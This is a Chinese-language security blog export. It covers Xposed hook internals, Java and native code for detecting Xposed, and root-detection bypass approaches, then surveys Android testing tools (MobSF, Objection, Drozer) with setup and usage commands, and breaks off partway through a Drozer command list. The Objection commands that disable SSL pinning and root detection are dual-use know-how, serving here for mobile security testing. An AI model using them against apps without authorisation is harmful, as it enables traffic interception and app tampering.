Installer框架中真正起作用的是对方法的Hook和Replace。在Android系统启动的时候，Zygote进程加载XposedBridge.jar，将所有需要替换的Method通过JNI方法hookMethodNative指向Native方法xposedCallHandler，这个方法再通过调用handleHookedMethod这个Java方法来调用被劫持的方法转入Hook逻辑。</p><p>上面提到的hookMethodNative是XposedBridge.jar中的私有的本地方法，它将一个方法对象作为传入参数并修改Dalvik虚拟机中对于该方法的定义，把该方法的类型改变为Native并将其实现指向另外一个B方法。</p><p>换言之，当调用那个被Hook的A方法时，其实调用的是B方法，调用者是不知道的。在hookMethodNative的实现中，会调用XposedBridge.jar中的handleHookedMethod这个方法来传递参数。handleHookedMethod这个方法类似于一个统一调度的Dispatch例程，其对应的底层的C++函数是xposedCallHandler。而handleHookedMethod实现里面会根据一个全局结构hookedMethodCallbacks来选择相应的Hook函数并调用他们的before和after函数，当多模块同时Hook一个方法的时候Xposed会自动根据Module的优先级来排序。</p><p>调用顺序如下：A.before -&gt; B.before -&gt; original method -&gt; B.after -&gt; A.after。</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>在做Android App的安全防御中检测点众多，Xposed Installer检测是必不可少的一环。对于Xposed框架的防御总体上分为两层：Java层和Native层。</p><p>Java层检测<br>需要说明的是，Java层的检测基本只能检测出基础的Xposed Installer框架，而不能防护其对App内方法的Hook，如果框架中带有反检测则Java层检测大多不起作用。</p><p>下面列出Java层的检测点，仅供参考。</p><p>① 通过PackageManager查看安装列表</p><p>最简单的检测，我们调用Android提供的PackageManager的API来遍历系统中App的安装情况来辨别是否有安装Xposed Installer相关的软件包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PackageManager packageManager = context.getPackageManager();</span><br><span class="line">List applicationInfoList = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);</span><br><span class="line"><span class="keyword">for</span> (ApplicationInfo applicationInfo: applicationInfoList) &#123;</span><br><span class="line">    <span class="keyword">if</span> (applicationInfo.packageName.equals(<span class="string">&quot;de.robv.android.xposed.installer&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// is Xposed TODO... &#125;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通常情况下使用Xposed Installer框架都会屏蔽对其的检测，即Hook掉PackageManager的getInstalledApplications方法的返回值，以便过滤掉de.robv.android.xposed.installer来躲避这种检测。</p><p>② 自造异常读取栈</p><p>Xposed Installer框架对每个由Zygote孵化的App进程都会介入，因此在程序方法异常栈中就会出现Xposed相关的“身影”，我们可以通过自造异常Catch来读取异常堆栈的形式，用以检查其中是否存在Xposed的调用方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;blah&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    <span class="keyword">for</span> (StackTraceElement stackTraceElement: e.getStackTrace()) &#123;</span><br><span class="line">        <span class="comment">// stackTraceElement.getClassName() stackTraceElement.getMethodName() 是否存 在Xposed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">E/GEnvironment: no such table: preference (code <span class="number">1</span>): <span class="keyword">while</span> compiling: SELECT keyguard_show_livewallpaper FROM preference</span><br><span class="line">...</span><br><span class="line">at com.meituan.test.extpackage.ExtPackageManager.checkUpdate(ExtPackageManager.java:<span class="number">127</span>)</span><br><span class="line">at com.meituan.test.MiFGService$<span class="number">1.</span>run(MiFGService.java:<span class="number">41</span>)</span><br><span class="line">at android.os.Looper.loop(Looper.java:<span class="number">136</span>)</span><br><span class="line">at android.app.ActivityThread.main(ActivityThread.java:<span class="number">5072</span>)</span><br><span class="line">at java.lang.reflect.Method.invokeNative(Native Method)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">515</span>)</span><br><span class="line">...</span><br><span class="line">at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:<span class="number">793</span>)</span><br><span class="line">at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:<span class="number">609</span>)</span><br><span class="line">at de.robv.android.xposed.XposedBridge.main(XposedBridge.java:<span class="number">132</span>) <span class="comment">//发现Xposed模块</span></span><br><span class="line">at dalvik.system.NativeStart.main(Native Method)</span><br></pre></td></tr></table></figure><p>③ 检查关键Java方法被变为Native JNI方法</p><p>当一个Android App中的Java方法被莫名其妙地变成了Native JNI方法，则非常有可能被Xposed Hook了。由此可得，检查关键方法是不是变成Native JNI方法，也可以检测是否被Hook。</p><p>通过反射调用Modifier.isNative(method.getModifiers())方法可以校验方法是不是Native JNI方法，Xposed同样可以篡改isNative这个方法的返回值。</p><p>④ 反射读取XposedHelper类字段</p><p>通过反射遍历XposedHelper类中的fieldCache、methodCache、constructorCache变量，读取HashMap缓存字段，如字段项的key中包含App中唯一或敏感方法等，即可认为有Xposed注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> methodCache = CheckHook(clsXposedHelper, <span class="string">&quot;methodCache&quot;</span>, keyWord);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">CheckHook</span><span class="params">(Object cls, String filedName, String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> result = <span class="keyword">false</span>;</span><br><span class="line">    String interName;</span><br><span class="line">    Set keySet;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Field filed = cls.getClass().getDeclaredField(filedName);</span><br><span class="line">        filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keySet = filed.get(cls)).keySet();</span><br><span class="line">        <span class="keyword">if</span> (!keySet.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Object aKeySet: keySet) &#123;</span><br><span class="line">                interName = aKeySet.toString().toLowerCase();</span><br><span class="line">                <span class="keyword">if</span> (interName.contains(<span class="string">&quot;meituan&quot;</span>) || interName.contains(<span class="string">&quot;dianping&quot;</span>) ) &#123;</span><br><span class="line">                    result = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    &#125; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Native层检测<br>由上文可知，无论在Java层做何种检测，Xposed都可以通过Hook相关的API并返回指定的结果来绕过检测，只要有方法就可以被Hook。如果仅在Java层检测就显得很徒劳，为了有效提搞检测准确率，就须做到Java和Native层同时检测。每个App在系统中都有对应的加载库列表，这些加载库列表在/proc/下对应的pid/maps文件中描述，在Native层读取/proc/self/maps文件不失为检测Xposed Installer的有效办法之一。由于Xposed Installer通常只能Hook Java层，因此在Native层使用C来解析/proc/self/maps文件，搜检App自身加载的库中是否存在XposedBridge.jar、相关的Dex、Jar和So库等文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">bool <span class="title">is_xposed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   bool rel = <span class="keyword">false</span>;</span><br><span class="line">   FILE *fp = NULL;</span><br><span class="line">   <span class="keyword">char</span>* filepath = <span class="string">&quot;/proc/self/maps&quot;</span>;</span><br><span class="line">   ...</span><br><span class="line">   string xp_name = <span class="string">&quot;XposedBridge.jar&quot;</span>;</span><br><span class="line">   fp = fopen(filepath,<span class="string">&quot;r&quot;</span>)) </span><br><span class="line">   <span class="keyword">while</span> (!feof(fp))                                 </span><br><span class="line">   &#123;</span><br><span class="line">       fgets(strLine,BUFFER_SIZE,fp);                    </span><br><span class="line">       origin_str = strLine;</span><br><span class="line">       str = trim(origin_str);</span><br><span class="line">       <span class="keyword">if</span> (contain(str,xp_name))</span><br><span class="line">       &#123;</span><br><span class="line">           rel = <span class="keyword">true</span>; <span class="comment">//检测到Xposed模块</span></span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>缺点:<br>无法hook 接口、抽象类和native方法</p><hr><h1 id="root检测绕过"><a href="#root检测绕过" class="headerlink" title="root检测绕过"></a>root检测绕过</h1><p>hook调用api的函数<br>开源的RootCloak用来对抗root监测<br><a href="https://github.com/devadvance/rootcloak">https://github.com/devadvance/rootcloak</a></p><p>Xposed 插件: rootCloak</p><h2 id="修改系统文件"><a href="#修改系统文件" class="headerlink" title="修改系统文件"></a>修改系统文件</h2><p>tool:<br>git clone <a href="https://github.com/dineshshetty/Android-InsecureBankv2.git">https://github.com/dineshshetty/Android-InsecureBankv2.git</a></p><h2 id="Objection-hook关键函数"><a href="#Objection-hook关键函数" class="headerlink" title="Objection hook关键函数"></a>Objection hook关键函数</h2><h2 id="修改smali代码重新打包实现永久绕过"><a href="#修改smali代码重新打包实现永久绕过" class="headerlink" title="修改smali代码重新打包实现永久绕过"></a>修改smali代码重新打包实现永久绕过</h2><hr><h2 id="简单hook实例"><a href="#简单hook实例" class="headerlink" title="简单hook实例"></a>简单hook实例</h2><p>(1) 打开AS新建项目工程,然后新建module(模块),本文名为“HookLoginModule”,AndroidManifest.xml添加标识</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 添加标识 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 进入hook模块后显示信息 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;xposeddescript&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;Xposed Proxy For HOOK&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 规定jar包的版本信息 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;54&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在HookLoginModule下的build.gradle中添加依赖(更多版本依赖:<a href="https://bintray.com/rovo89/de.robv.android.xposed/api">https://bintray.com/rovo89/de.robv.android.xposed/api</a><br>)：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compileOnly &#x27;de.robv.android.xposed:api:82&#x27;</span><br></pre></td></tr></table></figure><p><code> 注意：一定为“compileOnly”，老版本AS请用“provided”，不能为“implementation”或“compile”</code><br>(2) XposedHook项目文件夹下,新建文件夹lib,将XposedBridgeApi.jar放入此文件夹下<br>(3) 放入之后选择Build Path选项,如果提示add 就要添加<br>(4)在模块的src/main/assets（若没有assets目录请新建个）下新建文件xposed_init并将Module类的完整类名写进去以完成Hook入口类的注册：<br><code>com.q0o0p.xposedhook.Moudle</code><br>(5) src -&gt; com.q0o0p.xposedhook下新建Moudle.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Moudle</span> <span class="title">implments</span> <span class="title">IXposedHookLoadBackage</span></span>&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>参考：<br><a href="https://tech.meituan.com/2018/02/02/android-anti-hooking.html">https://tech.meituan.com/2018/02/02/android-anti-hooking.html</a></p><p>root检测绕过:<br><a href="https://bbs.pediy.com/thread-266265.htm">https://bbs.pediy.com/thread-266265.htm</a></p><p>xposed hook app:<br><a href="https://www.52pojie.cn/thread-1315865-1-1.html">https://www.52pojie.cn/thread-1315865-1-1.html</a></p><p><a href="https://www.jianshu.com/p/68b3f6bb0e32">https://www.jianshu.com/p/68b3f6bb0e32</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android安全检测工具</title>
      <link href="/2021/03/29/Blackbox-tool/"/>
      <url>/2021/03/29/Blackbox-tool/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="OWASP-MASVS"><a href="#OWASP-MASVS" class="headerlink" title="OWASP MASVS"></a>OWASP MASVS</h2><p>• MSTG-STORAGE-1：“系统凭据存储功能被适当地用于存储敏感数据，例如用户凭据或加密密<br>钥。”<br>• MSTG-STORAGE-2：“不应将任何敏感数据存储在应用程序容器或系统凭据存储设施之外。”<br>• MSTG-STORAGE-3：“没有敏感数据写入应用程序日志。”<br>• MSTG-STORAGE-4：“除非敏感数据是体系结构的必要组成部分，否则不会与第三方共享敏感<br>数据。”<br>• MSTG-STORAGE-5：“在处理敏感数据的文本输入上，键盘缓存被禁用。”<br>• MSTG-STORAGE-6：“没有通过 IPC 机制公开敏感数据。”<br>• MSTG-STORAGE-7：“没有通过用户界面公开敏感数据，例如密码或密码。”<br>• MSTG-STORAGE-8：“移动操作系统生成的备份中不包含敏感数据。”<br>• MSTG-STORAGE-9：“当应用程序移至后台时，该应用程序将从视图中删除敏感数据。”<br>• MSTG-STORAGE-10：“该应用程序在内存中保存敏感数据的时间不会超过必要的时间，并且<br>使用后会明确清除内存。”<br>• MSTG-STORAGE-11：“应用程序强制执行最低设备访问安全策略，例如要求用户设置设备密<br>码。”</p><p>• MSTG-PLATFORM-2：“来自外部源和用户的所有输入都经过验证，并且在必要时进行了清<br>理。这包括通过 UI，IPC 机制（如意图，自定义 URL 和网络源）接收的数据。”<br>• MSTG-AUTH-1：“如果应用程序向用户提供对远程服务的访问，某种形式的身份验证，例如<br>用户名/密码身份验证，将在远程终端执行。”<br>• MSTG-AUTH-8：“生物特征认证（如果有）不受事件限制（即使用仅返回“true”或“false”的<br>API）。相反，它是基于解锁 keychain/keystore。”<br>• MSTG-STORAGE-11：“应用程序强制执行最低设备访问安全策略，例如要求用户设置设备密<br>码。”</p><p>• MSTG-NETWORK-2：“ TLS 设置符合当前的最佳实践，如果移动操作系统不支持建议的标<br>准，则设置应尽可能接近。”<br>• MSTG-NETWORK-3：“当建立安全通道时，该应用程序将验证远程端点的 X.509 证书。仅接<br>受由受信任的 CA 签名的证书。”<br>• MSTG-NETWORK-4：“该应用程序使用其自己的证书存储或固定端点证书或公共密钥，并且<br>随后即使与受信任的 CA 签署，也不会与提供不同证书或密钥的端点建立连接。”<br>• MSTG-NETWORK-6：“该应用程序仅依赖于最新的连接性和安全性库。”</p><p>• MSTG-PLATFORM-1：“该应用仅请求必要的最小权限集。”<br>• MSTG-PLATFORM-2：“来自外部源和用户的所有输入都经过验证，如有必要，还应进行清<br>理。这包括通过 UI 接收的数据，IPC 机制（如意图，自定义 URL 和网络源）。”<br>• MSTG-PLATFORM-3：“除非正确保护了这些机制，否则该应用程序不会通过自定义 URL 方案<br>导出敏感功能。”<br>• MSTG-PLATFORM-4：“除非正确保护了这些机制，否则该应用程序不会通过 IPC 设施导出敏<br>感功能。”<br>• MSTG-PLATFORM-5：“除非明确要求，否则在 WebView 中禁用 JavaScript。”<br>• MSTG-PLATFORM-6：“将 WebView 配置为仅允许所需的最少协议处理程序集（理想情况<br>下，仅支持 https）。禁用了潜在危险的处理程序，例如文件，tel 和 app-id。”<br>• MSTG-PLATFORM-7：“如果将应用程序的本机方法公开给 WebView，请验证 WebView 仅呈<br>现应用程序包中包含的 JavaScript。”<br>• MSTG-PLATFORM-8：“对象序列化（如果有的话）是使用安全的序列化 API 实现的。”<br>• MSTG-ARCH-9：“存在用于强制执行移动应用程序更新的机制。”</p><h2 id="CWE"><a href="#CWE" class="headerlink" title="CWE"></a>CWE</h2><p>• CWE-117 - Improper Output Neutralization for Logs<br>• CWE-200 - Information Exposure<br>• CWE-316 - Cleartext Storage of Sensitive Information in Memory<br>• CWE-359 - Exposure of Private Information (‘Privacy Violation’)<br>• CWE-524 - Information Exposure Through Caching<br>• CWE-532 - Information Exposure Through Log Files<br>• CWE-534 - Information Exposure Through Debug Log Files<br>• CWE-311 - Missing Encryption of Sensitive Data<br>• CWE-312 - Cleartext Storage of Sensitive Information<br>• CWE-522 - Insufficiently Protected Credentials<br>• CWE-530 - Exposure of Backup File to an Unauthorized Control Sphere<br>• CWE-634 - Weaknesses that Affect System Processes<br>• CWE-922 - Insecure Storage of Sensitive Information</p><p>• CWE-287-认证不当。<br>• CWE-604-使用客户端身份验证。</p><p>• CWE-295 - Improper Certificate Validation<br>• CWE-296 - Improper Following of a Certificate’s Chain of Trust -<br><a href="https://cwe.mitre.org/data/definitions/296.html">https://cwe.mitre.org/data/definitions/296.html</a><br>• CWE-297 - Improper Validation of Certificate with Host Mismatch -<br><a href="https://cwe.mitre.org/data/definitions/297.html">https://cwe.mitre.org/data/definitions/297.html</a><br>• CWE-298 - Improper Validation of Certificate Expiration -<br><a href="https://cwe.mitre.org/data/definitions/298.html">https://cwe.mitre.org/data/definitions/298.html</a></p><p>• CWE-79 - Improper Neutralization of Input During Web Page Generation<br>• CWE-200 - Information Leak / Disclosure<br>• CWE-749 - Exposed Dangerous Method or Function<br>• CWE-939 - Improper Authorization in Handler for Custom URL Scheme</p><hr><h1 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h1><h2 id="OWASP-Zed-Attack-Proxy-ZAP"><a href="#OWASP-Zed-Attack-Proxy-ZAP" class="headerlink" title="OWASP Zed Attack Proxy (ZAP)"></a>OWASP Zed Attack Proxy (ZAP)</h2><p>官网：<a href="https://www.zaproxy.org/download/">https://www.zaproxy.org/download/</a></p><h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>mitmproxy is a free and open source interactive HTTPS proxy.<br>官网：<a href="https://mitmproxy.org/">https://mitmproxy.org/</a></p><h2 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h2><p>移动安全框架开源<br>github地址:<br><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p><p>官方文档: <a href="https://mobsf.github.io/docs/#/installation">https://mobsf.github.io/docs/#/installation</a></p><h3 id="MobSF安装"><a href="#MobSF安装" class="headerlink" title="MobSF安装"></a>MobSF安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/MobSF/Mobile-Security-Framework-MobSF.git</span><br><span class="line"><span class="built_in">cd</span> Mobile-Security-Framework-MobSF</span><br><span class="line">setup.bat</span><br><span class="line"></span><br><span class="line">//运行</span><br><span class="line">run.bat 127.0.0.1:8000</span><br></pre></td></tr></table></figure><hr><h2 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h2><p>Objection 是一个“运行时进行移动探测的工具包，由 Frida 提供支持”。它的主要目标是通过直观<br>的界面在非 root 设备上进行安全测试。</p><h3 id="安装-Objection"><a href="#安装-Objection" class="headerlink" title="安装 Objection"></a>安装 Objection</h3><p>Objection 可以通过 pip 安装，如 Objection’s Wiki.所述。<br><code>$ pip3 install objection</code></p><p>启动 Objection 取决于是否已更新 APK 或是否使用运行 Frida-server 的 root 设备。对于运行已修补的 APK，Objection将自动查找任何连接的设备并搜索一个小工具。<br>但是，在使用 Frida-serve时，需要明确地告诉 frida-serve 要分析哪个应用程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Connecting to a patched APK</span></span><br><span class="line">objection explore</span><br><span class="line"><span class="comment"># Find the correct name using frida-ps</span></span><br><span class="line">$ frida-ps -Ua | grep -i telegram</span><br><span class="line">30268 Telegram org.telegram.messenger</span><br><span class="line"><span class="comment"># Connecting to the Telegram app through Frida-server</span></span><br><span class="line">$ objection --gadget=<span class="string">&quot;org.telegram.messenger&quot;</span> explore</span><br><span class="line">一旦进入 Objection REPL，就可以执行任何可用的命令。下面是一些最有用的方法的概述：</span><br><span class="line"><span class="comment"># Show the different storage locations belonging to the app</span></span><br><span class="line">$ env</span><br><span class="line"><span class="comment"># Disable popular ssl pinning methods</span></span><br><span class="line">$ android sslpinning <span class="built_in">disable</span></span><br><span class="line"><span class="comment"># List items in the keystore</span></span><br><span class="line">$ android keystore list</span><br><span class="line"><span class="comment"># Try to circumvent root detection</span></span><br><span class="line">$ android root <span class="built_in">disable</span></span><br></pre></td></tr></table></figure><p>关于使用 Objection REPL 的更多信息可以在 Objection Wiki 上找到。</p><h3 id="使用-objection"><a href="#使用-objection" class="headerlink" title="使用 objection"></a>使用 objection</h3><p>当您在特定应用程序上工作并希望复制可能在其沙盒中的文件时，此选项非常有用（请注意，您<br>只能访问目标应用程序有权访问的文件）。这种方法无需将应用程序设置为可调试，否则在使用<br>android studio 的设备文件资源管理器时就需要调试。<br>首先，按照“推荐工具- Objection”中的说明，通过 Objection 连接到应用程序。然后，像在终端上<br>一样使用 ls 和 cd 来浏览可用的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ frida-ps -U | grep -i owasp</span><br><span class="line">21228 sg.vp.owasp_mobile.omtg_android</span><br><span class="line">$ objection -g sg.vp.owasp_mobile.omtg_android explore</span><br><span class="line">...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] <span class="comment"># cd ..</span></span><br><span class="line">/data/user/0/sg.vp.owasp_mobile.omtg_android</span><br><span class="line">...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] <span class="comment"># ls</span></span><br><span class="line">Type ... Name</span><br><span class="line">--------- ... -------------------</span><br><span class="line">Directory ... cache</span><br><span class="line">Directory ... code_cache</span><br><span class="line">Directory ... lib</span><br><span class="line">Directory ... shared_prefs</span><br><span class="line">Directory ... files</span><br><span class="line">Directory ... app_ACRA-approved</span><br><span class="line">Directory ... app_ACRA-unapproved</span><br><span class="line">Directory ... databases</span><br><span class="line">Readable: True Writable: True</span><br></pre></td></tr></table></figure><p>如果有要下载的文件，只需运行 file download&lt;some\ u file&gt;。这将下载该文件到您的工作目录。<br>同样的方法，您可以上传文件使用文件上传。</p><hr><p>qark安装<br><a href="https://blog.csdn.net/vivian_ll/article/details/84769520">https://blog.csdn.net/vivian_ll/article/details/84769520</a><br>qark使用python2.7</p><p>交互模式<br>无脑模式</p><p>python bytes和str两种类型可以通过函数encode()和decode()相互转换，<br>str→bytes：encode()方法。<br>bytes→str：decode()方法。</p><h2 id="自动化安全分析工具"><a href="#自动化安全分析工具" class="headerlink" title="自动化安全分析工具"></a>自动化安全分析工具</h2><p>• QARK<br>• Androbugs<br>• JAADAS<br>• MobSF</p><hr><p>APKInspector<br>带有GUI的安卓应用分析工具<br>github下载: <a href="https://github.com/honeynet/apkinspector/">https://github.com/honeynet/apkinspector/</a></p><hr><h2 id="Drozer"><a href="#Drozer" class="headerlink" title="Drozer"></a>Drozer</h2><p>Drozer 是一个 Android 安全评估框架，它允许您通过扮演与另一个应用程序的 IPC 端点和底层操<br>作系统交互的第三方应用程序的角色来搜索应用程序和设备中的安全漏洞。<br>使用 Drozer 的优势在于它能够自动执行多个任务，并且可以通过模块进行扩展。这些模块非常有<br>用，它们涵盖了不同的类别，包括扫描类，其可以通过简单的命令扫描已知缺陷，比如<br>scanner.provider.injection 模块，可以在系统中安装的所有应用程序的 content providers 中检<br>测 SQL 注入。如果没有 drozer，列出应用程序权限等简单任务需要几个步骤，包括反编译 APK 和<br>手动分析结果。</p><h3 id="windows-搭建环境"><a href="#windows-搭建环境" class="headerlink" title="windows 搭建环境"></a>windows 搭建环境</h3><p><a href="https://pypi.org/project/protobuf/#files">https://pypi.org/project/protobuf/#files</a><br>下载压缩包: protobuf-3.15.8.tar.gz<br>将里面的google文件夹放到E:\python2.7\Lib\site-packages下<br>其他缺少的安装包根据启动时的报错提示进行安装.<br><img src="1.png"></p><h3 id="启动Drozer"><a href="#启动Drozer" class="headerlink" title="启动Drozer"></a>启动Drozer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb connect 192.168.56.101:5555 #连接到模拟器</span><br><span class="line">adb forward tcp:31415 tcp:31415 #进行端口转发</span><br><span class="line"></span><br><span class="line">//启动移动设备中的drozer agent，将右下角的关闭置为打开状态：</span><br><span class="line"></span><br><span class="line">drozer console connect</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list #列出设备中安装的包</span><br><span class="line"></span><br><span class="line">run app.package.list -f app名称 #不一定非得是完整的包名</span><br><span class="line"></span><br><span class="line">run app.package.info #获取安装的包的信息</span><br><span class="line"></span><br><span class="line">run app.package.info -a com.android.browser #列举指定包的信息</span><br><span class="line"></span><br><span class="line">run app.package.info -p android.permission.INTERNET #列出具有相应权限的包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">run app.activity.info #列举设备上所有的activity</span><br><span class="line"></span><br><span class="line">run app.activity.info -f 包名 #搜索包的activity</span><br><span class="line"></span><br><span class="line"></span><br><span 